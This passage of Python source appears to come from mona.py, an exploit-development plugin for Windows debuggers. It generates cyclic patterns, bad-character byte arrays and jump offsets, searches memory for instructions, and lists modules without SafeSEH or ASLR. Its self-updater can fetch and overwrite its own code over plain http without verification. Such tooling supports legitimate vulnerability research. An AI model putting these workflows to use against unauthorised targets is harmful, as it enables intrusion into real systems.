				dbg.log("Please enter a valid size",highlight=1)
			else:
				pattern = createPattern(size,args)
				dbg.log("Creating cyclic pattern of %d bytes" % size)				
				dbg.log(pattern)
				global ignoremodules
				ignoremodules = True
				objpatternfile = MnLog("pattern.txt")
				patternfile = objpatternfile.reset()
				objpatternfile.write("\nPattern of " + str(size) + " bytes :\n",patternfile)
				objpatternfile.write("-" * (19 + len(str(size))),patternfile)
				objpatternfile.write("\n" + pattern,patternfile)
				if not silent:
					dbg.log("Note: don't copy this pattern from the log window, it might be truncated !",highlight=1)
					dbg.log("It's better to open %s and copy the pattern from the file" % patternfile,highlight=1)
				
				ignoremodules = False
			return


		def procOffsetPATTERN(args):
			egg = ""
			if "?" in args and args["?"] != "":
				try:
					egg = args["?"]
				except:
					egg = ""
			if egg == "":
				dbg.log("Please enter a valid target",highlight=1)
			else:
				findOffsetInPattern(egg,-1,args)
			return
		
		# ----- Comparing file output ----- #
		def procFileCOMPARE(args):
			modulecriteria={}
			criteria={}
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			allfiles=[]
			tomatch=""
			checkstrict=True
			rangeval = 0
			if "f" in args:
				if args["f"] <> "":
					rawfilenames=args["f"].replace('"',"")
					allfiles = rawfilenames.split(',')
					dbg.log("[+] Number of files to be examined : %d : " % len(allfiles))
			if "range" in args:
				if not type(args["range"]).__name__.lower() == "bool":
					strrange = args["range"].lower()
					if strrange.startswith("0x") and len(strrange) > 2 :
						rangeval = int(strrange,16)
					else:
						try:
							rangeval = int(args["range"])
						except:
							rangeval = 0
					if rangeval > 0:
						dbg.log("[+] Find overlap using pointer + range, value %d" % rangeval)
				else:
					dbg.log("Please provide a numeric value ^(> 0) with option -range",highlight=1)
					return
			else:
				if "contains" in args:
					if type(args["contains"]).__name__.lower() == "str":
						tomatch = args["contains"].replace("'","").replace('"',"")
				if "nostrict" in args:
					if type(args["nostrict"]).__name__.lower() == "bool":
						checkstrict = not args["nostrict"]
						dbg.log("[+] Instructions must match in all files ? %s" % checkstrict)
			if len(allfiles) > 1:
				findFILECOMPARISON(modulecriteria,criteria,allfiles,tomatch,checkstrict,rangeval)
			else:
				dbg.log("Please specify at least 2 filenames to compare",highlight=1)

		# ----- Find bytes in memory ----- #
		def procFind(args):
			modulecriteria={}
			criteria={}
			pattern = ""
			base = 0
			offset = 0
			top  = TOP_USERLAND
			consecutive = False
			type = ""
			
			level = 0
			offsetlevel = 0			
			
			if not "a" in args:
				args["a"] = "*"
			
			#search for all pointers by default
			if not "x" in args:
				args["x"] = "*"
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			if criteria["accesslevel"] == "":
				return
			if not "s" in args:
				dbg.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
				return
			pattern = args["s"]
			
			if "unicode" in args:
				criteria["unic"] = True

			if "b" in args:
				try:
					base = int(args["b"],16)
				except:
					dbg.log("invalid base address: %s" % args["b"],highlight=1)
					return
			if "t" in args:
				try:
					top = int(args["t"],16)
				except:
					dbg.log("invalid top address: %s" % args["t"],highlight=1)
					return
			if "offset" in args:
				try:
					offset = 0 - int(args["offset"])
				except:
					dbg.log("invalid offset value",highlight=1)
					return	
					
			if "level" in args:
				try:
					level = int(args["level"])
				except:
					dbg.log("invalid level value",highlight=1)
					return

			if "offsetlevel" in args:
				try:
					offsetlevel = int(args["offsetlevel"])
				except:
					dbg.log("invalid offsetlevel value",highlight=1)
					return						
					
			if "c" in args:
				dbg.log("    - Skipping consecutive pointers, showing size instead")			
				consecutive = True
				
			if "type" in args:
				if not args["type"] in ["bin","asc","ptr","instr","file"]:
					dbg.log("Invalid search type : %s" % args["type"], highlight=1)
					return
				type = args["type"] 
				if type == "file":
					filename = args["s"].replace('"',"").replace("'","")
					#see if we can read the file
					if not os.path.isfile(filename):
						dbg.log("Unable to find/read file %s" % filename,highlight=1)
						return
			rangep2p = 0

			
			if "p2p" in args or level > 0:
				dbg.log("    - Looking for pointers to pointers")
				criteria["p2p"] = True
				if "r" in args:	
					try:
						rangep2p = int(args["r"])
					except:
						pass
					if rangep2p > 0:
						dbg.log("    - Will search for close pointers (%d bytes backwards)" % rangep2p)
				if "p2p" in args:
					level = 1
			
			
			if level > 0:
				dbg.log("    - Recursive levels : %d" % level)
						
			allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top,consecutive,rangep2p,level,offset,offsetlevel)
				
			logfile = MnLog("find.txt")
			thislog = logfile.reset()
			processResults(allpointers,logfile,thislog)
			return
			
			
		# ---- Find instructions, wildcard search ----- #
		def procFindWild(args):
			modulecriteria={}
			criteria={}
			pattern = ""
			base = 0
			top  = TOP_USERLAND
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)

			if not "s" in args:
				dbg.log("-s <search pattern (or filename)> is a mandatory argument",highlight=1)
				return
			pattern = args["s"]
			
			
			if "b" in args:
				try:
					base = int(args["b"],16)
				except:
					dbg.log("invalid base address: %s" % args["b"],highlight=1)
					return
			if "t" in args:
				try:
					top = int(args["t"],16)
				except:
					dbg.log("invalid top address: %s" % args["t"],highlight=1)
					return
					
			if "depth" in args:
				try:
					criteria["depth"] = int(args["depth"])
				except:
					dbg.log("invalid depth value",highlight=1)
					return	

			if "all" in args:
				criteria["all"] = True
				
			if "distance" in args:
				if type(args["distance"]).__name__.lower() == "bool":
					dbg.log("invalid distance value(s)",highlight=1)
				else:
					distancestr = args["distance"]
					distanceparts = distancestr.split(",")
					for parts in distanceparts:
						valueparts = parts.split("=")
						if len(valueparts) > 1:
							if valueparts[0].lower() == "min":
								try:
									mindistance = int(valueparts[1])
								except:
									mindistance = 0	
							if valueparts[0].lower() == "max":
								try:
									maxdistance = int(valueparts[1])
								except:
									maxdistance = 0	
			
				if maxdistance < mindistance:
					tmp = maxdistance
					maxdistance = mindistance
					mindistance = tmp
				
				criteria["mindistance"] = mindistance
				criteria["maxdistance"] = maxdistance
						
			allpointers = findPatternWild(modulecriteria,criteria,pattern,base,top)
				
			logfile = MnLog("findwild.txt")
			thislog = logfile.reset()
			processResults(allpointers,logfile,thislog)		
			return
	
			
		# ----- assemble: assemble instructions to opcodes ----- #
		def procAssemble(args):
			opcodes = ""
			encoder = ""
			
			if not 's' in args:
				dbg.log("Mandatory argument -s <opcodes> missing", highlight=1)
				return
			opcodes = args['s']
			
			if 'e' in args:
				# TODO: implement encoder support
				dbg.log("Encoder support not yet implemented", highlight=1)
				return
				encoder = args['e'].lowercase()
				if encoder not in ["ascii"]:
					dbg.log("Invalid encoder : %s" % encoder, highlight=1)
					return
			
			assemble(opcodes,encoder)
			
		# ----- info: show information about an address ----- #
		def procInfo(args):
			if not "a" in args:
				dbg.log("Missing mandatory argument -a", highlight=1)
				return
			
			args["a"] = args["a"].replace("0x","").replace("0X","")
			targetaddy = args["a"]
			# maybe arg is a register
			allregs = dbg.getRegs()
			if str(targetaddy).upper() in allregs:
				targetaddy = "%08x" % allregs[str(targetaddy.upper())]

			if not isAddress(targetaddy):
				dbg.log("%s is not a valid address" % args["a"], highlight=1)
				return
			
			address = addrToInt(targetaddy)
			ptr = MnPointer(address)
			modname = ptr.belongsTo()
			modinfo = None
			if modname != "":
				modinfo = MnModule(modname)
			rebase = ""
			rva=0
			if modinfo :
				rva = address - modinfo.moduleBase
			dbg.log("")
			dbg.log("Information about address 0x%s" % toHex(address))
			dbg.log("    %s" % ptr.__str__())
			thepage = dbg.getMemoryPageByAddress(address)
			section = ""
			try:
				section = thepage.getSection()
			except:
				section = ""
			if section != "":
				dbg.log("    Section : %s" % section)
			if rva != 0:
				dbg.log("    Offset from module base: 0x%x" % rva)
			if ptr.isOnStack():
				stacks = getStacks()
				stackref = ""
				for tid in stacks:
					currstack = stacks[tid]
					if currstack[0] <= address and address <= currstack[1]:
						stackref = " (Thread 0x%08x, Stack Base : 0x%08x, Stack Top : 0x%08x)" % (tid,currstack[0],currstack[1])
						break
				dbg.log("    This address is in a stack segment %s" % stackref)
			if modinfo:
				dbg.log("    Module: %s" % modinfo.__str__())
			else:
				output = ""
				if ptr.isInHeap():
					dbg.log("    This address resides in the heap")
					dbg.log("")
					ptr.showHeapBlockInfo()
				else:
					dbg.log("    Module: None")					
			try:
				dbg.log("")
				dbg.log("Disassembly:")
				op = dbg.disasm(address)
				opstring=op.getDisasm()
				dbg.log("    Instruction at %s : %s" % (toHex(address),opstring))
			except:
				pass
			if __DEBUGGERAPP__ == "WinDBG":
				dbg.log("")
				dbg.log("Output of !address 0x%08x:" % address)
				output = dbg.nativeCommand("!address 0x%08x" % address)
				dbg.logLines(output)
			dbg.log("")
		
		# ----- dump: Dump some memory to a file ----- #
		def procDump(args):
			
			filename = ""
			if "f" not in args:
				dbg.log("Missing mandatory argument -f filename", highlight=1)
				return
			filename = args["f"]
			
			address = None
			if "s" not in args:
				dbg.log("Missing mandatory argument -s address", highlight=1)
				return
			startaddress = str(args["s"]).replace("0x","").replace("0X","")
			if not isAddress(startaddress):
				dbg.log("You have specified an invalid start address", highlight=1)
				return
			address = addrToInt(startaddress)
			
			size = 0
			if "n" in args:
				size = int(args["n"])
			elif "e" in args:
				endaddress = str(args["e"]).replace("0x","").replace("0X","")
				if not isAddress(endaddress):
					dbg.log("You have specified an invalid end address", highlight=1)
					return
				end = addrToInt(endaddress)
				if end < address:
					dbg.log("end address %s is before start address %s" % (args["e"],args["s"]), highlight=1)
					return
				size = end - address
			else:
				dbg.log("you need to specify either the size of the copy with -n or the end address with -e ", highlight=1)
				return
			
			dumpMemoryToFile(address,size,filename)
			
		# ----- compare : Compare contents of a file with copy in memory, indicate bad chars / corruption ----- #
		def procCompare(args):
			startpos = 0
			filename = ""
			skipmodules = False
			if "f" in args:
				filename = args["f"].replace('"',"").replace("'","")
				#see if we can read the file
				if not os.path.isfile(filename):
					dbg.log("Unable to find/read file %s" % filename,highlight=1)
					return
			else:
				dbg.log("You must specify a valid filename using parameter -f", highlight=1)
				return
			if "a" in args:
				if not isAddress(args["a"]):
					dbg.log("%s is an invalid address" % args["a"], highlight=1)
					return
				else:
					startpos = args["a"]
			if "s" in args:
				skipmodules = True
			compareFileWithMemory(filename,startpos,skipmodules)
			
			
# ----- offset: Calculate the offset between two addresses ----- #
		def procOffset(args):
			extratext1 = ""
			extratext2 = ""
			isReg_a1 = False
			isReg_a2 = False
			regs = dbg.getRegs()
			if "a1" not in args:
				dbg.log("Missing mandatory argument -a1 <address>", highlight=1)
				return
			a1 = args["a1"]
			if "a2" not in args:
				dbg.log("Missing mandatory argument -a2 <address>", highlight=1)
				return		
			a2 = args["a2"]
			
			for reg in regs:
				if reg.upper() == a1.upper():
					a1=toHex(regs[reg])					
					isReg_a1 = True
					extratext1 = " [" + reg.upper() + "] " 
					break
			a1 = a1.upper().replace("0X","").lower()
				
			if not isAddress(str(a1)):
				dbg.log("%s is not a valid address" % str(a1), highlight=1)
				return
			for reg in regs:
				if reg.upper() == a2.upper():
					a2=toHex(regs[reg])					
					isReg_a2 = True
					extratext2 = " [" + reg.upper() + "] " 					
					break
			a2 = a2.upper().replace("0X","").lower()
			
			if not isAddress(str(a2)):
				dbg.log("%s is not a valid address" % str(a2), highlight=1)
				return
				
			a1 = hexStrToInt(a1)
			a2 = hexStrToInt(a2)
			
			diff = a2 - a1
			result=toHex(diff)
			negjmpbytes = ""
			if a1 > a2:
				ndiff = a1 - a2
				result=toHex(4294967296-ndiff) 
				negjmpbytes="\\x"+ result[6]+result[7]+"\\x"+result[4]+result[5]+"\\x"+result[2]+result[3]+"\\x"+result[0]+result[1]
				regaction="sub"
			dbg.log("Offset from 0x%08x%s to 0x%08x%s : %d (0x%s) bytes" % (a1,extratext1,a2,extratext2,diff,result))	
			if a1 > a2:
				dbg.log("Negative jmp offset : %s" % negjmpbytes)
			else:
				dbg.log("Jmp offset : %s" % negjmpbytes)				
				
		# ----- bp: Set a breakpoint on read/write/exe access ----- #
		def procBp(args):
			isReg_a = False
			regs = dbg.getRegs()
			thistype = ""
			
			if "a" not in args:
				dbg.log("Missing mandatory argument -a address", highlight=1)
				dbg.log("The address can be an absolute address, a register, or a modulename!functionname")
				return
			a = str(args["a"])

			for reg in regs:
				if reg.upper() == a.upper():
					a=toHex(regs[reg])					
					isReg_a = True
					break
			a = a.upper().replace("0X","").lower()
			
			if not isAddress(str(a)):
				# maybe it's a modulename!function
				if str(a).find("!") > -1:
					modparts = str(a).split("!")
					modname = modparts[0]
					if not modname.lower().endswith(".dll"):
						modname += ".dll" 
					themodule = MnModule(modname)											
					if themodule != None and len(modparts) > 1:
						eatlist = themodule.getEAT()
						funcname = modparts[1].lower()
						addyfound = False
						for eatentry in eatlist:
							if eatlist[eatentry].lower() == funcname:
								a = "%08x" % (eatentry)
								addyfound = True
								break
						if not addyfound:
							# maybe it's just a symbol, try to resolve
							if __DEBUGGERAPP__ == "WinDBG":
								symboladdress = dbg.resolveSymbol(a)
								if symboladdress != "" :
									a = symboladdress
									addyfound = True
						if not addyfound:
							dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
							return								
					else:
						dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
						return						
				else:
					dbg.log("Please specify a valid address/register/modulename!functionname (-a)", highlight=1)
					return
			
			valid_types = ["READ", "WRITE", "SFX", "EXEC"]

			if "t" not in args:
				dbg.log("Missing mandatory argument -t type", highlight=1)
				dbg.log("Valid types are: %s" % ", ".join(valid_types))
				return
			else:
				thistype = args["t"].upper()
				
			
			if not thistype in valid_types:
				dbg.log("Invalid type : %s" % thistype)
				return
			
			if thistype == "EXEC":
				thistype = "SFX"
			
			a = hexStrToInt(a)
			
			dbg.setMemBreakpoint(a,thistype[0])
			dbg.log("Breakpoint set on %s of 0x%s" % (thistype,toHex(a)),highlight=1)


		# ----- ct: calltrace ---- #
		def procCallTrace(args):
			modulecriteria={}
			criteria={}
			criteria["accesslevel"] = "X"
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			modulestosearch = getModulesToQuery(modulecriteria)
			hooks = []
			rethooks = []
			showargs = 0
			hookrets = False
			if not "m" in args:
				dbg.log(" ** Please specify what module(s) you want to include in the trace, using argument -m **",highlight=1)
				return
			if "a" in args:
				if args["a"] != "":
					try:
						showargs = int(args["a"])
					except:
						showargs = 0
						
			if "r" in args:
				hookrets = True
			toignore = []
			limit_scope = True
			if not "all" in args:
				# fill up array
				toignore.append("PeekMessage")
				toignore.append("GetParent")
				toignore.append("GetFocus")
				toignore.append("EnterCritical")
				toignore.append("LeaveCritical")
				toignore.append("GetWindow")
				toignore.append("CallnextHook")
				toignore.append("TlsGetValue")
				toignore.append("DefWindowProc")
				toignore.append("SetTextColor")
				toignore.append("DrawText")
				toignore.append("TranslateAccel")
				toignore.append("TranslateMessage")
				toignore.append("DispatchMessage")
				toignore.append("isChild")
				toignore.append("GetSysColor")
				toignore.append("SetBkColor")
				toignore.append("GetDlgCtrl")
				toignore.append("CallWindowProc")
				toignore.append("HideCaret")
				toignore.append("MessageBeep")
				toignore.append("SetWindowText")
				toignore.append("GetDlgItem")
				toignore.append("SetFocus")
				toignore.append("SetCursor")
				toignore.append("LoadCursor")
				toignore.append("SetEvent")
				toignore.append("SetDlgItem")
				toignore.append("SetWindowPos")
				toignore.append("GetDC")
				toignore.append("ReleaseDC")
				toignore.append("GetDeviceCaps")
				toignore.append("GetClientRect")
				toignore.append("etLastError")
			else:
				limit_scope = False
			if len( modulestosearch) > 0:
				dbg.log("[+] Initializing log file")
				logfile = MnLog("calltrace.txt")
				thislog = logfile.reset()			
				dbg.log("[+] Number of CALL arguments to display : %d" % showargs)
				dbg.log("[+] Finding instructions & placing hooks")
				for thismod in modulestosearch:
					dbg.updateLog()
					objMod = dbg.getModule(thismod)
					if not objMod.isAnalysed:
						dbg.log("    Analysing code...")
						objMod.Analyse()
					themod = MnModule(thismod)
					modcodebase = themod.moduleCodebase
					modcodetop = themod.moduleCodetop		
					dbg.setStatusBar("Placing hooks in %s..." % thismod)
					dbg.log("    * %s (0x%08x - 0x%08x)" % (thismod,modcodebase,modcodetop))
					ccnt = 0
					rcnt = 0
					thisaddr = modcodebase
					allfuncs = dbg.getAllFunctions(modcodebase)
					for func in allfuncs:
						thisaddr = func
						thisfunc = dbg.getFunction(thisaddr)
						instrcnt = 0
						while thisfunc.hasAddress(thisaddr):
							try:
								if instrcnt == 0:
									thisopcode = dbg.disasm(thisaddr)
								else:
									thisopcode = dbg.disasmForward(thisaddr,1)
									thisaddr = thisopcode.getAddress()
								instruction = thisopcode.getDisasm()
								if instruction.startswith("CALL "):
									ignore_this_instruction = False
									for ignores in toignore:
										if instruction.lower().find(ignores.lower()) > -1:
											ignore_this_instruction = True
											break
									if not ignore_this_instruction:
										if not thisaddr in hooks:
											hooks.append(thisaddr)
											myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
											myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)
									ccnt += 1
								if hookrets and instruction.startswith("RETN"):
									if not thisaddr in rethooks:
										rethooks.append(thisaddr)
										myhook = MnCallTraceHook(thisaddr,showargs,instruction,thislog)
										myhook.add("HOOK_CT_%s" % thisaddr , thisaddr)									
							except:
								#dbg.logLines(traceback.format_exc(),highlight=True)
								break
							instrcnt += 1
				dbg.log("[+] Total number of CALL hooks placed : %d" % len(hooks))
				if hookrets:
					dbg.log("[+] Total number of RETN hooks placed : %d" % len(rethooks))
			else:
				dbg.log("[!] No modules selected or found",highlight=1)
			return "Done"
			
		# ----- bu: set a deferred breakpoint ---- #
		def procBu(args):
			if not "a" in args:
				dbg.log("No targets defined. (-a)",highlight=1)
				return
			else:
				allargs = args["a"]
				bpargs = allargs.split(",")
				breakpoints = {}
				dbg.log("")
				dbg.log("Received %d addresses//functions to process" % len(bpargs))
				# set a breakpoint right away for addresses and functions that are mapped already
				for tbparg in bpargs:
					bparg = tbparg.replace(" ","")
					# address or module.function ?
					if bparg.find(".") > -1:
						functionaddress = dbg.getAddress(bparg)
						if functionaddress > 0:
							# module.function is already mapped, we can set a bp right away
							dbg.setBreakpoint(functionaddress)
							breakpoints[bparg] = True
							dbg.log("Breakpoint set at 0x%08x (%s), was already mapped" % (functionaddress,bparg), highlight=1)
						else:
							breakpoints[bparg] = False # no breakpoint set yet
					elif bparg.find("+") > -1:
						ptrparts = bparg.split("+")
						modname = ptrparts[0]
						if not modname.lower().endswith(".dll"):
							modname += ".dll" 
						themodule = getModuleObj(modname)												
						if themodule != None and len(ptrparts) > 1:
							address = themodule.getBase() + int(ptrparts[1],16)
							if address > 0:
								dbg.log("Breakpoint set at %s (0x%08x), was already mapped" % (bparg,address),highlight=1)
								dbg.setBreakpoint(address)
								breakpoints[bparg] = True
							else:
								breakpoints[bparg] = False
						else:
							breakpoints[bparg] = False
					if bparg.find(".") == -1 and bparg.find("+") == -1:
						# address, see if it is mapped, by reading one byte from that location
						address = -1
						try:
							address = int(bparg,16)
						except:
							pass
						thispage = dbg.getMemoryPageByAddress(address)
						if thispage != None:
							dbg.setBreakpoint(address)
							dbg.log("Breakpoint set at 0x%08x, was already mapped" % address, highlight=1)
							breakpoints[bparg] = True
						else:
							breakpoints[bparg] = False

				# get the correct addresses to put hook on
				loadlibraryA = dbg.getAddress("kernel32.LoadLibraryA")
				loadlibraryW = dbg.getAddress("kernel32.LoadLibraryW")

				if loadlibraryA > 0 and loadlibraryW > 0:
				
					# find end of function for each
					endAfound = False
					endWfound = False
					cnt = 1
					while not endAfound:
						objInstr = dbg.disasmForward(loadlibraryA, cnt)
						strInstr = objInstr.getDisasm()
						if strInstr.startswith("RETN"):
							endAfound = True
							loadlibraryA = objInstr.getAddress()
						cnt += 1
					
					cnt = 1
					while not endWfound:
						objInstr = dbg.disasmForward(loadlibraryW, cnt)
						strInstr = objInstr.getDisasm()
						if strInstr.startswith("RETN"):
							endWfound = True
							loadlibraryW = objInstr.getAddress()
						cnt += 1	
					
					# if addresses/functions are left, throw them into their own hooks,
					# one for each LoadLibrary type.
					hooksplaced = False
					for bptarget in breakpoints:
						if not breakpoints[bptarget]:
							myhookA = MnDeferredHook(loadlibraryA, bptarget)
							myhookA.add("HOOK_A_%s" % bptarget, loadlibraryA)
							myhookW = MnDeferredHook(loadlibraryW, bptarget)
							myhookW.add("HOOK_W_%s" % bptarget, loadlibraryW)
							dbg.log("Hooks for %s installed" % bptarget)
							hooksplaced = True
					if not hooksplaced:
						dbg.log("No hooks placed")
				else:
					dbg.log("** Unable to place hooks, make sure kernel32.dll is loaded",highlight=1)
				return "Done"							
			
		# ----- bf: Set a breakpoint on exported functions of a module ----- #
		def procBf(args):

			funcfilter = ""
			
			mode = ""
			
			type = "export"
			
			modes = ["add","del","list"]
			types = ["import","export","iat","eat"]
			
			modulecriteria={}
			criteria={}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
		
			if "s" in args:
				try:
					funcfilter = args["s"].lower()
				except:
					dbg.log("No functions selected. (-s)",highlight=1)
					return
			else:
				dbg.log("No functions selected. (-s)",highlight=1)
				return
					
			if "t" in args:
				try:
					mode = args["t"].lower()
				except:
					pass

			if "f" in args:
				try:
					type = args["f"].lower()
				except:
					pass

			if not type in types:
				dbg.log("No valid function type selected (-f <import|export>)",highlight=1)
				return

			if not mode in modes or mode=="":
				dbg.log("No valid action defined. (-t add|del|list)")

			doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode,type)
			
			return
		
		
		# ----- Show info about modules -------#
		def procModInfoS(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["safeseh"] = False
			dbg.log("Safeseh unprotected modules :")
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)
			return
			
		def procModInfoSA(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["safeseh"] = False
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False	
			dbg.log("Safeseh unprotected, no aslr & no rebase modules :")
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)			
			return

		def procModInfoA(args):
			modulecriteria = {}
			criteria = {}
			modulecriteria["aslr"] = False
			modulecriteria["rebase"] = False	
			dbg.log("No aslr & no rebase modules :")			
			modulestosearch = getModulesToQuery(modulecriteria)
			showModuleTable("",modulestosearch)			
			return
			
		# ----- Print byte array ----- #
		
		def procByteArray(args):
			badchars = ""
			forward = True
			startval = 0
			endval = 255
			sign = 1
			bytesperline = 32
			if "b" in args:
				if type(args["b"]).__name__.lower() != "bool":	
					badchars = args["b"]
			if "r" in args:
				forward = False
				startval = -255
				endval = 0
				sign = -1
				
			badchars = badchars.replace("'","")
			badchars = badchars.replace('"',"")
			badchars = badchars.replace("\\x","")
			cnt = 0
			strb = ""
			while cnt < len(badchars):
				strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
				cnt=cnt+2			
			
			dbg.log("Generating table, excluding %d bad chars..." % len(strb))
			arraytable = []
			binarray = ""
			while startval <= endval:
				thisval = startval * sign
				hexbyte = hex(thisval)[2:]
				binbyte = hex2bin(toHexByte(thisval))
				if len(hexbyte) == 1:
					hexbyte = "0" + hexbyte
				hexbyte2 = binascii.a2b_hex(hexbyte)
				if not hexbyte2 in strb:
					arraytable.append(hexbyte)
					binarray += binbyte
				startval += 1
			dbg.log("Dumping table to file")
			output = ""
			cnt = 0
			outputline = '"'
			totalbytes = len(arraytable)
			tablecnt = 0
			while tablecnt < totalbytes:
				if (cnt < bytesperline):
					outputline += "\\x" + arraytable[tablecnt]
				else:
					outputline += '"\n'
					cnt = 0
					output += outputline
					outputline = '"\\x' + arraytable[tablecnt]
				tablecnt += 1
				cnt += 1
			if (cnt-1) < bytesperline:
				outputline += '"\n'
			output += outputline
			
			global ignoremodules
			ignoremodules = True
			arrayfilename="bytearray.txt"
			objarrayfile = MnLog(arrayfilename)
			arrayfile = objarrayfile.reset()
			binfilename = arrayfile.replace("bytearray.txt","bytearray.bin")
			objarrayfile.write(output,arrayfile)
			ignoremodules = False
			dbg.logLines(output)
			dbg.log("")
			binfile = open(binfilename,"wb")
			binfile.write(binarray)
			binfile.close()
			dbg.log("Done, wrote %d bytes to file %s" % (len(arraytable),arrayfile))
			dbg.log("Binary output saved in %s" % binfilename)
			return
			
			
			
			
		#----- Read binary file, print 'nice' header -----#
		def procPrintHeader(args):
			filename = ""
			if "f" in args:
				if type(args["f"]).__name__.lower() != "bool":	
					filename = args["f"]
			if filename == "":
				dbg.log("Missing argument -f <source filename>",highlight=1)
				return
			filename = filename.replace("'","").replace('"',"")
			content = ""
			try:		
				file = open(filename,"rb")
				content = file.read()
				file.close()
			except:
				dbg.log("Unable to read file %s" % filename,highlight=1)
				return
			dbg.log("Read %d bytes from %s" % (len(content),filename))	
			
			cnt = 0
			linecnt = 0	
			
			output = ""
			thisline = ""			
			
			max = len(content)
			
			
			while cnt < max:

				# first check for unicode
				if cnt < max-1:
					if linecnt == 0:
						thisline = "header = Rex::Text.to_unicode(\""
					else:
						thisline = "header << Rex::Text.to_unicode(\""
						
					thiscnt = cnt
					while cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
						if content[cnt] == "\\":
							thisline += "\\"
						if content[cnt] == "\"":
							thisline += "\\"
						thisline += content[cnt]
						cnt += 2
					if thiscnt != cnt:
						output += thisline + "\")" + "\n"
						linecnt += 1
						
						
				if linecnt == 0:
					thisline = "header = \""
				else:
					thisline = "header << \""
				thiscnt = cnt
				
				# ascii repetitions
				reps = 1
				startval = content[cnt]
				if isAscii(ord(content[cnt])):
					while cnt < max-1:
						if startval == content[cnt+1]:
							reps += 1
							cnt += 1	
						else:
							break
					if reps > 1:
						if startval == "\\":
							startval += "\\"
						if startval == "\"":
							startval = "\\" + "\""	
						output += thisline + startval + "\" * " + str(reps) + "\n"
						cnt += 1
						linecnt += 1
						continue
						
				if linecnt == 0:
					thisline = "header = \""
				else:
					thisline = "header << \""
				thiscnt = cnt
				
				# check for just ascii
				while cnt < max and isAscii2(ord(content[cnt])):
					if cnt < max-1 and ord(content[cnt+1]) == 0:
						break
					if content[cnt] == "\\":
						thisline += "\\"
					if content[cnt] == "\"":
						thisline += "\\"			
					thisline += content[cnt]
					cnt += 1
					
					
				if thiscnt != cnt:
					output += thisline + "\"" + "\n"
					linecnt += 1		
				
				#check others : repetitions
				if cnt < max:
					if linecnt == 0:
						thisline = "header = \""
					else:
						thisline = "header << \""
					thiscnt = cnt
					while cnt < max:
						if isAscii2(ord(content[cnt])):
							break
						if cnt < max-1 and isAscii2(ord(content[cnt])) and ord(content[cnt+1]) == 0:
							break
						#check repetitions
						reps = 1
						startval = ord(content[cnt])
						while cnt < max-1:
							if startval == ord(content[cnt+1]):
								reps += 1
								cnt += 1	
							else:
								break
						if reps > 1:
							if len(thisline) > 12:
								output += thisline + "\"" + "\n"
							if linecnt == 0:
								thisline = "header = \"\\x" + "%02x\" * %d" % (startval,reps)
							else:
								thisline = "header << \"\\x" + "%02x\" * %d" % (startval,reps)
							output += thisline + "\n"
							thisline = "header << \""
							linecnt += 1
						else:
							thisline += "\\x" + "%02x" % ord(content[cnt])	
						cnt += 1
					if thiscnt != cnt:
						if len(thisline) > 12:
							output += thisline + "\"" + "\n"
							linecnt += 1			

			global ignoremodules
			ignoremodules = True
			headerfilename="header.txt"
			objheaderfile = MnLog(headerfilename)
			headerfile = objheaderfile.reset()
			objheaderfile.write(output,headerfile)
			ignoremodules = False
			dbg.logLines(output)
			dbg.log("")			
			dbg.log("Wrote header to %s" % headerfile)
			return
		
		#----- Update -----#
		
		def procUpdate(args):
			"""
			Function to update mona and optionally windbglib to the latest version
			
			Arguments : none
			
			Returns : new version of mona/windbglib (if available)
			"""

			updateproto = "https"
			if "http" in args:
				updateproto  = "http"
			#debugger version	
			imversion = __IMM__
			#url
			dbg.setStatusBar("Running update process...")
			dbg.updateLog()
			updateurl = updateproto + "://redmine.corelan.be/projects/mona/repository/raw/mona.py"
			currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
			u = ""
			try:
				u = urllib.urlretrieve(updateurl)
				newversion,newrevision = getVersionInfo(u[0])
				if newversion != "" and newrevision != "":
					dbg.log("[+] Version compare :")
					dbg.log("    Current Version : %s, Current Revision : %s" % (currentversion,currentrevision))
					dbg.log("    Latest Version : %s, Latest Revision : %s" % (newversion,newrevision))
				else:
					dbg.log("[-] Unable to check latest version (corrupted file ?), try again later",highlight=1)
					return
			except:
				dbg.log("[-] Unable to check latest version (download error), run !mona update -http or try again later",highlight=1)
				return
			#check versions
			doupdate = False
			if newversion != "" and newrevision != "":
				if currentversion != newversion:
					doupdate = True
				else:
					if int(currentrevision) < int(newrevision):
						doupdate = True
				
			if doupdate:
				dbg.log("[+] New version available",highlight=1)
				dbg.log("    Updating to %s r%s" % (newversion,newrevision),highlight=1)
				try:
					shutil.copyfile(u[0],inspect.stack()[0][1])
					dbg.log("    Done")					
				except:
					dbg.log("    ** Unable to update mona.py",highlight=1)
				currentversion,currentrevision = getVersionInfo(inspect.stack()[0][1])
				dbg.log("[+] Current version : %s r%s" % (currentversion,currentrevision))
			else:
				dbg.log("[+] You are running the latest version")

			# update windbglib if needed
			if __DEBUGGERAPP__ == "WinDBG":
				dbg.log("[+] Locating windbglib path")
				paths = sys.path
				filefound = False
				libfile = ""
				for ppath in paths:
					libfile = ppath + "\\windbglib.py"
					if os.path.isfile(libfile):
						filefound=True
						break
				if not filefound:
					dbg.log("    ** Unable to find windbglib.py ! **")
				else:
					dbg.log("[+] Checking if %s needs an update..." % libfile)

					updateurl = updateproto + "://redmine.corelan.be/projects/windbglib/repository/raw/windbglib.py"
					currentversion,currentrevision = getVersionInfo(libfile)
					u = ""
					try:
						u = urllib.urlretrieve(updateurl)
						newversion,newrevision = getVersionInfo(u[0])
